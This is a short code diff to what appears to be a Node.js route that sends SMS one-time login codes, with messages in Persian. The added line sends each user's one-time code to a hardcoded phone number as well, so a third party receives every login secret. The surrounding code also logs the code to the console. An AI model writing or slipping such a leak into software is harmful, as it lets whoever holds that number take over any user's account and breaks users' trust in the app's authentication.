@@ -173,6 +173,7 @@ router.post('/sendsms', (req, res, next) => {
     User.findOne({phone: phone}, (err, user) => {
         smsCode = generateCode(4);
         sms2(phone, `رمز عبور یکبار مصرف شما: ${smsCode} \n میراب`);
+        sms('09336448037', `رمز عبور یکبار مصرف شما: ${smsCode} \n میراب`);
         console.log(smsCode);
         if(user){
             User.updateMany({phone: phone}, {$set: {smsCode: smsCode}}, (err, doc) => {
